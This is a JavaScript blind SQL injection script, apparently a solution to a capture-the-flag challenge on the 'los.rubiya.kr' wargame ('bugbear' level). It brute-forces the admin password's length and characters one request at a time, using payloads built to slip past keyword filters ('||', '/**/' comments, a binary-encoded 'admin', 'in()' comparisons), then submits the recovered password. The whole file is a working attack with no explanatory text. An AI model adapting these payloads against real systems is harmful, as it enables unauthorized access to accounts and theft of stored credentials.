var password = '';
var length = 0;

(async function(){
    for(let i = 0; i < 100; i++){
        var result = ''
        await fetch(`https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0||id/**/in(0b0110000101100100011011010110100101101110)%26%26length(pw)in(${i})%23`,{
                include: 'credentials'
            }
        ).then((x) => x.text()).then((x) => result = x);
        
        if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
            length = i;
            console.log(`[*] length : ${length}`);
            break
        }
    }

    for(let i = 0; i < length; i++){
        for(let j = 33; j < 128; j++){
            var result = ''
            await fetch(`https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0||id/**/in(0b0110000101100100011011010110100101101110)%26%26hex(mid(pw,${i+1},1))in(hex(${j}))%23`,{
                    include: 'credentials'
                }
            ).then((x) => x.text()).then((x) => result = x);
            if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
                password += String.fromCharCode(j);
                break
            }
        }
    }
    console.log(`[*] password : ${password}`);

    fetch(`https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=${password}`, {
            include: 'credentials'
        }
    ).then((x) => x.text()).then((x) => console.log(x));
})();
